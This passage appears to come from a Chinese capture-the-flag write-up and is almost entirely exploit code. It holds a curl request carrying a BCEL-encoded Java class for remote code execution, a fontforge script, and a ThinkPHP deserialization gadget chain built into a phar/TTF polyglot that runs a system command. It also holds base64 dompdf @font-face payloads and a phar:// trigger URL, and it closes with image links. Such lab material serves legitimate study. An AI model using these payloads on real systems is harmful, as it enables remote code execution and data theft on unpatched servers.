    --data-binary $'query=runMain%28com.sun.org.apache.bcel.internal.util.JavaWrapper.new%28%29%2C%22%24%24BCEL%24%24%24l%248b%24I%24A%24A%24A%24A%24A%24A%24A%248dV%24c9w%24d3F%24Y%24ffMb%245b%24b2%24y%24g%24e2%24E%2482%24d8w%249c%2440%24ecR%24ba%2440%24C%2494%2490%24Q%24a08%2481b%24m%2485P%2440Q%2486D%24c4%2496%248c%24q%24t%24a1%24fbBw%24ba%24aft%24a1%24x%24a5%24eb%24a1%24X%24c3%2483G%24l%24e7%24k%24fb%245e%24P%24fd%24T%24faz%24e8%24b5%2487%243e%24dao%24q%249b%24d8%24c4%24b4%24f5a4%24f3%24ad%24bf%24f9%24b6%24f1O%24d7%24_%24ff%24I%24e0N%247c%24af%24m%248a%24fd%24K%24O%2460%2440%24y%24P%24c88%24a8%24e0%24Q%24Ge%24i%2496%24f0%24a0%24C%24JG%24q%24iUp%24M%24ba%248c%24n%24Z%2486%248ca%24Z%245cF%24b7%24e0%24j%24971%24o%24a3G%24c2%24a8%24900e%24f4%24ca8%24a1%2460%24MY%24FM%24c8%24c9%24b0%24c4%24d7%2496%2491%2497qRl%24j%24Z%24ae%24MOFA%24c6%24b8p%243d%24ncR%24c2%24v%24F%24P%24e1a%24b1%243c%24a2%24e0Q%243c%24a6%24609%24k%2497%24f1%2484%24f8%243e%24v%2496%24a7d%243c%24z%24e3%24b4%2484g%24Y%24o%24hM%24cb%24f463%24d4%24tZ%24P0%2484%24ba%24eda%24ce%24d0%24906%24z%24de_%24c8%24Nqg%249f%243e%2494%24rJ%243cm%24hz%24f6%2480%24ee%2498%24e2%245c%24o%2486%24bcQ%24d3ehL%24Pq%24p%249b%24ca%24e4%24j%24d3%24g%24d96nf%243b%24Z%24c2Gs%24bai1%24ccN%24M%24a6O%24e8%24e3z%24w%24ab%245b%24p%24a9%248c%24tD%243a%247dO%24ba32%24ce%24d0T%2483%24cd%24c0%24Mau%248a%24d1%249d%24d5%245dW%24d0s%24Ms%24x%24e8%24O%243f%249e%24e5%2486%2497%24ea%24e3%24de%24a8%243d%24y%24El%24BuJ%2460%24f7%24d0%24J%24e2%24T%24a3%24%24%24b7%2496%247c%243a%24dc%24cd%24d3U%24j%247e%2492%24n%243a%24c2%24bd%24B%24c7%24f4%24b8%24T%24ecwp%247dX%24ec%24p%24T%24rb%24bd%2491%24h%24ae%24b6v%24D%249fl%24d8%24b9%249cn%24N%24d3%24e5c%24c6%24a8%24ee%24b8%24dc%24eb%24d7s%24U%2491%24Z%24ZO7%24c6%24fa%24f4%24bc%24l%24n%24J%24h%24u%24ef%24S%249e%24a5%24acSZ%24Z%2494m%2493%24G%24cf%247b%24a6m%24b9%24S%249ec%2498%24Z%24A%24df%24a3%243b%24a4MN%24c9%249e%2492%24b1%24L%248e%24c1%247bM%24R%24e0%2486%24a9%2498%24s%24F%24M%24V%24v%24dc%24%24%24e1y%24V%24_%24e0E%24V%24_%24e1%24M%24c3F%24db%24ZI%24ba%24be%24dcqaf%24c2v%24c6%2492%24T%247c%24ui%24d8%2496%24c7%24t%24bd%24q%24dd%24b6%24c0%245d%24_%24b97%24f8v%24H%24e4%24jv%2496%24ae%24x%24e1e%24V%24af%24e0U%2486f%24KAI%24a2%24cb%24a3%247b%24O%24V%243cNp%24gnJ%2482%248a%24d7%24f0%243a%24B%24bf9%24c4tI%24Vo%24e0M%2486%24z%24ff%24XO%2486%243b%24e3%24d9%249aNc%243e%24W7Oa%24a2%24m%24uS%24c8%24Y%24W%24I%24c7%2493I7%24d0%249d%24b2%24R%24I%24abxK%24a0%245bQ%24z4%24eay%24f9%24e4%24OZ%24aa%243dV%24dd%24oH%24ad%248a%24b7%24f1%24O%2483d%24bbI%248b%24a0KxW%24c5%247b8%24ab%24e2%247d%247c%24m%24w%24c3%24b4%2486%24ed%24J%24V%24l%24e2%24p%24w%248f%24ed%245bwQ%249d%24ef%24df%24d7%24db%24be%245e%24c59%24nP%243f%24b0%24b3%249fJ%24zE%24d5%24x%24a5%2486L%24x%24e5R%24ce%24eb%24da%24N%24V%24l%24e3%24T%24a2%2489%24a0xY%24ea%248aF%24dfq%24c13%24a9k%24M%24dd%24b2D%24o%243eU%24f1%24Z%243eW%24f1%24F%24ceK%24f8R%24c5%24F%247c%24r%24d2%24fd5Y8%24dc%24a5%24e2%24h%247c%24ab%24e2%243b%24e1%24r%247c%243c%245b%24Q%2486%24c3F%24d6%24W%24f1i%24b8%24a9%24fb%24Y%24e6%24dc%24aaC%24a8%24df%24a6X7j%24b1%24w%24Q%24fbF%24jj%24E%24aad%24a3%24e08%24dc%24f2%24ca%24e7%24e6Dk%24faf%24v%24ea%2484Y%2494%249cRE%24f9%24f5%2491%24b6%2483%24%24%24d2%24aa%24c4%24xXB%24a7%24s%2483%24ba0K%24h%249fB%24vL%24d4%24Y%24h5%24s%2482%24e8%24dc%24f2%24dd%24b6%24d4%24d0%24Z%249c%24a6%24d3%24fao%24f3%24pbZ%24e3%24f6%24Y%24FuCb%24fa%24U%24Z%249cNj%24ad5k%24g%24JS%24P%24e5Dw%24f8p%24Z%24db%24M%24g%24R%245d%2486%24c1%245d%24d7%24MFg%24e2%2490%2498%2482%2495%24Vx%24ca%24f5x%24%24%24u%24fe%243d%248e%249d%24e7%248ew%248aa%24e5%247f%24c4%24e1%24c6H%248ayv%24da%249e%24e0N%24b7%24%24j%24a2%243a%245b%2495s%24cb%24f2h%24%24S%2480%24e7U%24g%24ee%24a6%24Z%2496%24R%245da%24Z%24bc%24b3%24f5%2490om%247f%243e_%24b6%24s%248b%24q%24Hyi%249a%249e%24d7%24cer%243d%24fb%24a4%24bd%24F%24cb3s%24e5%24b6%24z%24lfU%24a9%2495%24c8%24a4%24Y%24e2%2493%249c%24ba%24rQ%24f3%2495%24a8%24mQ%2440D%24ec%24aa%245d%2495%2488%24M%24b7%2491%24ab%249dV%24be%24e0%2491%24s%24d7%24v%2486%24zew%24a6%249d%24aa%2460%2490z%245b%24a2%24s%24a3%24f6%24h%24a5%24W%245c%24de%24c3%24b3f%24%24x%24QV%24dd%243a%24X%2495%24ad%24y%24aeeQ%243f%2460%24J%2492%24f4%24u%248b_%24j%2498%2498%24dc%24b4%24ae%24a5S%248a%24be%248c%24be%24e1%24b6%248b%2460%243f%24f8%24ec%243bh%248d%24f8D%24V%24eb%24fc%24d5%24X%24a0%24ff%24Uw%24d17%248a%24bbq%24P%24ea%2485r%24dd%24V%243a%24cd%24A%24d8%24c4%24r%24d4%24VQ%24l%24P%24V%24RN%24af%248eG%24ea%24afB%24wB%24ee%245b%24c3h%24X%24zB%24e9%24_%24J%24c4%24C%24B%24b5%24y%24b0%243a%243e%24a3%24b4%24ed%24I%24adi%24_%24Jw%2484%24b5%24d0%248d%247d%24a4%24a4y%24hi%24c6%24h%24C%24e1%2499%24jR%2489%24da%24u%24a8%24f1%24QQ%24P%24d6%24c7%249b2%2482%24rk2%24c1h%24d6%24a4%2460%24d5%24c2eKQM%24d6%24o%24q%24g%24r%24d1Y%24q%24aa%245cCS%2487%24S%24b9Jk%24y%243e%24fb%24SZ%248a%2498%24T%24d7%248a%2498%247b%24Wr%247c%24de%24F2%243c%24bfC%24z1%24W%24c4%24X%24fa%248c%24b8%24W%24T%24caZ%24y%24U_%2494%24b9%2480%24Gq%245c%24ec%24l%2497%24d0%24g%24d6%2494%248cF%24be%2496%24c6%2497UB%24d2%24a2%2481%24d7%24xX%247e%24f0%24SVh%24U%2484%2495E%24ac%24d2%24d4%248bH%24c4%245b%248bh%24xb%24b5%24c03%24Q%24e8%24ae%24v%245dR%248b%2496%2490%2497%24e8%24ed%24d3%24e8%24o%245d%24f5%247e%24baN%2460%24%24%24adqJU%24TZ%24d0L%24d9%249e%2485v%24cc%24c6z%243a%24f5%2460%24OvC%24c3%24m%24c9%249c%24c4%243c%249c%24c1%247cz%24i%24X%24d0%245b%24b2%24Q%24e7%24b1%24I%2497I%24fa%24g%2496%24e2W%24y%24c3o%24f4%248f%24ec%24P%24ac%24c0%249fX%2485%24ebH%24b0%24Q%24da%2498%2482%24d5%24ac%24Xk%24d8%24R%24b4%24b3q%24aa%24oQ%24S%24a7%2483%24b4%2493%24fd%24N%24a2%2440%24d8%24Y%243a%24d0Ie%24d2%24c2%248ea%24p6Q%24R%24za%24H%24b0%24Z%24f7%24S%24be%24k%24b6%24O%245b%2488%24W%24c2n%2496%2440%24X%24d1%24c2%24Yd%24f3%24b1%2495v%24R%249cd%24Rt%24TW%24o%245c%24bf%24T%24d6M%2490%24J%24d5%24cf%24d8F%24dc%24ua%24bb%248a%245el%2487B%24I%24_b%24Hy%248b%24R%24ces%24d8I4%24V%24f7%2491%24ef%24f5%24I%24fd%248d_%24a0J%24d8%24r%24n%24z%24a1OB%247fy%24N6%24c1%247e7%24J%24A%245d%24b4%24f9%24L%248bi%248da%24Pi%2487%24I%24f3%24fd%24d8%24x%24ca%249b%2491%24v%24ba%24T2%247e%24P%24ec%24fb%24H%245e%24c7%248a%249fH%24L%24A%24A%22%2C%27%27%29' 
    $'http://127.0.0.1:8080/hack'
```



```
<style>
    @font-face {
        font-family:'exploit';
        src:url('data:text/plain;base64,exp');
        font-weight:'normal';
        font-style:'normal';
    }
</style>
```



```
import fontforge
import os
import sys
import tempfile
from typing import Optional

def main():
    sys.stdout.buffer.write(do_generate_font())

def do_generate_font() -> bytes:
    fd, fn = tempfile.mkstemp(suffix=".ttf")
    os.close(fd)
    font = fontforge.font()
    font.copyright = "DUMMY FONT"
    font.generate(fn)
    with open(fn, "rb") as f:
        res = f.read()
    os.unlink(fn)
    result = res
    return result

if __name__ == "__main__":
    main()
```



```
<?php
namespace thinkprocesspipes{
    use thinkmodelPivot;
    ini_set('display_errors',1);
    class Windows{
        private $files = [];
        public function __construct($function,$parameter)
        {
            $this->files = [new Pivot($function,$parameter)];
        }
    }
//    $aaa = new Windows('system','whoami');
//    echo base64_encode(serialize($aaa));
}
namespace think{
    abstract class Model
    {}
}
namespace thinkmodel{
    use thinkModel;
    use thinkconsoleOutput;
    class Pivot extends Model
    {
        protected $append = [];
        protected $error;
        public $parent;
        public function __construct($function,$parameter)
        {
            $this->append['jelly'] = 'getError';
            $this->error = new relationBelongsTo($function,$parameter);
            $this->parent = new Output($function,$parameter);
        }
    }
    abstract class Relation
    {}
}
namespace thinkmodelrelation{
    use thinkdbQuery;
    use thinkmodelRelation;
    abstract class OneToOne extends Relation
    {}
    class BelongsTo extends OneToOne
    {
        protected $selfRelation;
        protected $query;
        protected $bindAttr = [];
        public function __construct($function,$parameter)
        {
            $this->selfRelation = false;
            $this->query = new Query($function,$parameter);
            $this->bindAttr = [''];
        }
    }
}
namespace thinkdb{
    use thinkconsoleOutput;
    class Query
    {
        protected $model;
        public function __construct($function,$parameter)
        {
            $this->model = new Output($function,$parameter);
        }
    }
}
namespace thinkconsole{
    use thinksessiondriverMemcache;
    class Output
    {
        protected $styles = [];
        private $handle;
        public function __construct($function,$parameter)
        {
            $this->styles = ['getAttr'];
            $this->handle = new Memcache($function,$parameter);
        }
    }
}
namespace thinksessiondriver{
    use thinkcachedriverMemcached;
    class Memcache
    {
        protected $handler = null;
        protected $config  = [
            'expire'       => '',
            'session_name' => '',
        ];
        public function __construct($function,$parameter)
        {
            $this->handler = new Memcached($function,$parameter);
        }
    }
}
namespace thinkcachedriver{
    use thinkRequest;
    class Memcached
    {
        protected $handler;
        protected $options = [];
        protected $tag;
        public function __construct($function,$parameter)
        {
            // pop链中需要prefix存在，否则报错
            $this->options = ['prefix'   => 'jelly/'];
            $this->tag = true;
            $this->handler = new Request($function,$parameter);
        }
    }
}
namespace think{
    class Request
    {
        protected $get     = [];
        protected $filter;
        public function __construct($function,$parameter)
        {
            $this->filter = $function;
            $this->get = ["jelly"=>$parameter];
        }
    }
}

namespace{
    $a = new thinkprocesspipesWindows('system','cat /flag > /var/www/html/public/1.txt');
    @unlink("test.phar");
    $phar = new Phar('test.phar');
    $phar->stopBuffering();
    $phar->setStub(file_get_contents("font.ttf").'<?php __HALT_COMPILER(); ?>');
    $phar->addFromString('test.txt', 'test');
    $phar->setMetadata($a);
    $phar->stopBuffering();

    echo base64_encode(file_get_contents("test.phar"));
}
```



```
<style>@font-face { font-family:'exploit'; src:url('data:text/plain;base64,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'); font-weight:'normal'; font-style:'normal';}</style>
```



```
<style>@font-face+{+font-family:'exploit';+src:url('phar%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fvendor%2Fdompdf%2Fdompdf%2Flib%2Ffonts%2Fexploit_normal_c87547a55b2617089f8e2d413c207323.ttf%23%23');+font-weight:'normal';+font-style:'normal';}</style>
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/3-1682322413.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/10-1682322413.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/9-1682322414.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/2-1682322417.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/2-1682322417.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/7-1682322417.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/4-1682322417.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/3-1682322418.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/7-1682322418.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/7-1682322419.png)